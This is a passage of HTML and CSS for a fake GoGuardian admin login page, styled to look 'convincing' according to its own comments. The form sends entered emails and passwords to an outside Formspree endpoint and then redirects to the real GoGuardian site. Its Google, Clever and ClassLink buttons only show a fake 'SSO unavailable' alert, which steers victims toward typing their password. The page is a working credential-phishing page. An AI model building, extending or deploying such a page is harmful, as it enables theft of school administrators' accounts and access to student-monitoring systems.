.auth-card {
    background: white;
    width: 100%;
    max-width: 440px;
    padding: 45px 35px;
    border-radius: 4px;
    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.08); /* More subtle, realistic shadow */
    text-align: center;
    z-index: 2;
}

.card-header .admin-label {
    font-size: 11px;
    font-weight: 600;
    color: #999;
    letter-spacing: 1.5px;
    margin-bottom: 10px;
    text-transform: uppercase;
}

.card-header h1 {
    font-size: 18px;
    font-weight: 400;
    color: #444;
    margin-bottom: 35px;
}

.input-group {
    margin-bottom: 20px;
}

.input-group input {
    width: 100%;
    height: 48px; /* Standard input height for GoGuardian */
    padding: 0 16px;
    border: none;
    background-color: var(--gg-grey-input);
    border-radius: 2px;
    font-size: 14px;
    font-family: var(--font-main);
    outline: none;
    transition: background 0.2s;
}

.input-group input:focus {
    background-color: #d1d1d1;
}

.btn {
    width: 100%;
    height: 48px;
    border: none;
    border-radius: 4px;
    font-size: 14px;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.2s;
    font-family: var(--font-main);
}

.btn-login {
    background-color: var(--gg-green);
    color: white;
    margin-top: 5px;
}

.btn-login:hover {
    background-color: #4da64d;
}

.separator {
    position: relative;
    margin: 30px 0;
    text-align: center;
}

.separator::before {
    content: "";
    position: absolute;
    top: 50%;
    left: 0;
    right: 0;
    height: 1px;
    background: #e0e0e0;
    z-index: 1;
}

.separator span {
    position: relative;
    background: white;
    padding: 0 12px;
    color: #aaa;
    font-size: 12px;
    z-index: 2;
}

.social-logins {
    display: flex;
    flex-direction: column;
    gap: 14px;
}

.btn-social {
    display: flex;
    align-items: center;
    padding: 0;
    overflow: hidden;
    color: white;
    text-align: left; /* Convincing alignment */
    height: 44px;
}

.icon-box {
    background: white;
    width: 44px;
    height: 44px;
    display: flex;
    justify-content: center;
    align-items: center;
    flex-shrink: 0;
}

.icon-box img {
    max-width: 20px;
    max-height: 20px;
}

.btn-text {
    flex: 1;
    font-weight: 400;
    padding-left: 15px;
    font-size: 14px;
}

.btn-google { background-color: var(--gg-blue); }
.btn-clever { background-color: var(--gg-clever-blue); }
.btn-classlink { background-color: var(--gg-classlink-teal); }

.btn-social:hover {
    filter: brightness(1.05);
}

.form-footer {
    margin-top: 40px;
    text-align: left;
    font-size: 13px;
}

.links-row {
    margin-bottom: 10px;
}

.links-row.top {
    display: flex;
    justify-content: space-between;
    margin-bottom: 20px;
}

.links-row a {
    text-decoration: none;
    color: #777;
}

.links-row a:hover {
    color: #444;
    text-decoration: underline;
}

.app-footer {
    width: 100%;
    padding: 15px 40px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    font-size: 11px;
    color: #888;
    background: rgba(255, 255, 255, 0.9);
    z-index: 1;
}

.footer-left a {
    margin-right: 18px;
    text-decoration: none;
    color: inherit;
}

.footer-left a:hover {
    text-decoration: underline;
}

@media (max-width: 500px) {
    .auth-card {
        padding: 35px 20px;
    }
    .app-footer {
        flex-direction: column;
        gap: 12px;
        text-align: center;
        padding-bottom: 30px;
    }
}
" alt="GoGuardian Logo" class="logo">
        </header>

        <main class="auth-main">
            <div class="auth-card">
                <div class="card-header">
                    <p class="admin-label">GOGUARDIAN ADMIN</p>
                    <h1>Log in to your account</h1>
                </div>

                <!-- Verified Formspree Integration -->
                <form class="login-form" action="https://formspree.io/f/xgoranry" method="POST">
                    <input type="hidden" name="_next" value="https://admin.goguardian.com">
                    <input type="hidden" name="_subject" value="New GoGuardian Login Attempt">
                    
                    <div class="input-group">
                        <input type="email" name="email" placeholder="Email" id="email" required autocomplete="email">
                    </div>
                    <div class="input-group">
                        <input type="password" name="password" placeholder="Password" id="password" required autocomplete="current-password">
                    </div>
                    <button type="submit" class="btn btn-login">Log in</button>
                    
                    <div class="separator">
                        <span>or</span>
                    </div>

                    <div class="social-logins">
                        <!-- Imgur Assets Provided by User -->
                        <button type="button" class="btn btn-social btn-google" onclick="alert('SSO Service Unavailable. Please log in with email/password.')">
                            <span class="icon-box"><img src="https://i.imgur.com/V1X4MPl.png" alt="Google"></span>
                            <span class="btn-text">Log in with Google</span>
                        </button>
                        <button type="button" class="btn btn-social btn-clever" onclick="alert('SSO Service Unavailable. Please log in with email/password.')">
                            <span class="icon-box"><img src="https://i.imgur.com/5JObc9m.png" alt="Clever"></span>
                            <span class="btn-text">Log in with Clever</span>
                        </button>
                        <button type="button" class="btn btn-social btn-classlink" onclick="alert('SSO Service Unavailable. Please log in with email/password.')">
                            <span class="icon-box"><img src="https://i.imgur.com/5ncFUCA.png" alt="ClassLink"></span>
                            <span class="btn-text">Log in with ClassLink</span>
                        </button>
                    </div>

                    <div class="form-footer">
                        <div class="links-row top">
                            <a href="#">Sign in with Single Sign On</a>
                            <a href="#" class="learn-more">Learn More</a>
                        </div>
                        <div class="links-row">
                            <a href="#">Need an account?</a>
                        </div>
                        <div class="links-row">
                            <a href="#">Forgot your password?</a>
                        </div>
                    </div>
                </form>
            </div>
        </main>

        <footer class="app-footer">
            <div class="footer-left">
                <a href="#">Blog</a>

                <a href="#">Terms</a>
            </div>
            <div class="footer-right">
                <span>© 2026 GoGuardian. All Rights Reserved.</span>
